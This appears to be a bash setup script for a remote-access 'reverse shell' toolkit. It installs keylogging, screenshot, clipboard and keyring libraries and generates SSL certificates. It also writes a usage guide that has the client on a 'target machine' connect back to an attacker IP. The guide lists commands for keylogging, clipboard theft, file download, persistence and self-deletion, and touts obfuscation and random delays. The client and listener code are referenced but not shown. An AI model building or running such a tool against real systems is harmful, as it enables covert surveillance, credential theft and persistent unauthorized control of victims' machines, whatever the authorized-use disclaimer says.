#!/bin/bash

# Reverse Shell Setup Script
# This script sets up the environment for the reverse shell project

echo "========================================"
echo "Reverse Shell Project Setup"
echo "========================================"

# Check if Python 3 is installed
if ! command -v python3 &> /dev/null; then
    echo "[!] Python 3 is not installed. Please install Python 3 first."
    exit 1
fi

echo "[+] Python 3 found: $(python3 --version)"

# Create virtual environment (optional but recommended)
echo "[+] Creating virtual environment..."
python3 -m venv venv
source venv/bin/activate 2>/dev/null || source venv/Scripts/activate 2>/dev/null

# Install core dependencies
echo "[+] Installing core dependencies..."
pip install --upgrade pip

# Core packages
pip install cryptography pyautogui pyperclip pillow requests

# Platform-specific packages
echo "[+] Installing platform-specific packages..."

# Check if we're on Windows
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
    echo "[+] Windows detected - installing Windows-specific packages..."
    pip install pywin32
else
    echo "[+] Unix-like system detected - installing Unix-specific packages..."
    pip install python-crontab psutil
fi

# Optional packages (install if available)
echo "[+] Installing optional packages..."
pip install pynput opencv-python keyring || echo "[!] Some optional packages failed to install (this is okay)"

# Create SSL certificates if openssl is available
echo "[+] Setting up SSL certificates..."
if command -v openssl &> /dev/null; then
    if [[ ! -f "server.pem" || ! -f "server.key" ]]; then
        echo "[+] Creating SSL certificate with OpenSSL..."
        openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365 -nodes \
            -subj "/C=US/ST=State/L=City/O=Test/CN=localhost" 2>/dev/null
        echo "[+] SSL certificate created successfully"
    else
        echo "[+] SSL certificates already exist"
    fi
else
    echo "[!] OpenSSL not found. SSL certificates will be created automatically using Python."
fi

# Create plugins directory
echo "[+] Creating plugins directory..."
mkdir -p plugins

# Create example plugin
cat > plugins/example.py << 'EOF'
#!/usr/bin/env python3
"""
Example plugin for the reverse shell
"""

def run(args):
    """
    Main plugin function
    Args: arguments passed from the listener
    Returns: result string
    """
    return f"Example plugin executed with args: {args}"
EOF

# Create another example plugin
cat > plugins/sysinfo.py << 'EOF'
#!/usr/bin/env python3
"""
Enhanced system information plugin
"""
import platform
import socket
import os

def run(args):
    """Get enhanced system information"""
    info = {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'architecture': platform.architecture()[0],
        'processor': platform.processor(),
        'python_version': platform.python_version(),
        'current_user': os.getenv('USER') or os.getenv('USERNAME', 'Unknown'),
        'current_directory': os.getcwd(),
    }
    
    result = "=== Enhanced System Information ===\n"
    for key, value in info.items():
        result += f"{key.replace('_', ' ').title()}: {value}\n"
    
    return result
EOF

# Create test script
cat > test_connection.py << 'EOF'
#!/usr/bin/env python3
"""
Simple connection test script
"""
import socket
import ssl

def test_connection(host, port):
    try:
        # Test basic socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        result = s.connect_ex((host, port))
        s.close()
        
        if result == 0:
            print(f"[+] Basic connection to {host}:{port} successful")
            return True
        else:
            print(f"[!] Cannot connect to {host}:{port}")
            return False
    except Exception as e:
        print(f"[!] Connection test error: {e}")
        return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python3 test_connection.py <host> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    test_connection(host, port)
EOF

# Create README with usage instructions
cat > USAGE.md << 'EOF'
# Reverse Shell Usage Guide

## Quick Start

1. **Start the listener** (on attacker machine):
   ```bash
   python3 reverse_shell_listener_multi.py 0.0.0.0 4444
   ```

2. **Run the client** (on target machine):
   ```bash
   python3 reverse_shell_client.py <attacker_ip> 4444
   ```

## Basic Commands

### Listener Commands
- `list` - Show active sessions
- `select <id>` - Interact with a session
- `help` - Show help information
- `exit` - Exit the listener

### Session Commands
- `sysinfo` - Get system information
- `ps` - List processes
- `upload <local> <remote>` - Upload file
- `download <remote> <local>` - Download file
- `screenshot <local_path>` - Take screenshot
- `keylog_start` - Start keylogger
- `keylog_stop` - Stop keylogger
- `keylog_dump <local_path>` - Download keylog
- `clipboard` - Get clipboard contents
- `persist` - Add persistence
- `selfdestruct` - Clean up and exit

## Security Notes

⚠️ **IMPORTANT**: This tool is for authorized penetration testing and educational purposes only. Never use on systems without explicit permission.

### Features for Defense Testing
- SSL/TLS encryption
- Authentication token
- Base64 obfuscation
- Random delays
- Comprehensive logging

## Testing Environment Setup

1. Use virtual machines for testing
2. Set up isolated network
3. Configure firewall rules appropriately
4. Monitor network traffic for detection testing

## Troubleshooting

### Common Issues
1. **SSL Certificate Errors**: Run the setup script to generate certificates
2. **Permission Denied**: Ensure proper file permissions
3. **Module Not Found**: Install dependencies with `pip install -r requirements.txt`
4. **Connection Refused**: Check firewall and network settings

### Debug Mode
Add debug prints to troubleshoot connection issues:
```python
import logging
logging.basicConfig(level=logging.DEBUG)
```
EOF

# Create requirements.txt
cat > requirements.txt << 'EOF'
# Core dependencies
cryptography>=3.4.8
pyautogui>=0.9.54
pyperclip>=1.8.2
pillow>=8.3.2
requests>=2.26.0

# Platform-specific (Windows)
pywin32>=301; sys_platform == "win32"

# Platform-specific (Unix)
python-crontab>=2.5.1; sys_platform != "win32"
psutil>=5.8.0; sys_platform != "win32"

# Optional packages
pynput>=1.7.3
opencv-python>=4.5.3.56
keyring>=23.2.1
EOF

echo ""
echo "========================================"
echo "Setup Complete!"
echo "========================================"
echo ""
echo "Next steps:"
echo "1. Review the USAGE.md file for instructions"
echo "2. Test the connection with: python3 test_connection.py <host> <port>"
echo "3. Start the listener: python3 reverse_shell_listener_multi.py 0.0.0.0 4444"
echo "4. Run the client: python3 reverse_shell_client.py <listener_ip> 4444"
echo ""
echo "Files created:"
echo "- reverse_shell_client.py (fixed client)"
echo "- reverse_shell_listener_multi.py (fixed listener)"
echo "- plugins/ (plugin directory with examples)"
echo "- requirements.txt (dependencies)"
echo "- USAGE.md (usage guide)"
echo "- test_connection.py (connection tester)"
echo ""
echo "⚠️  Remember: Use only in authorized environments!"
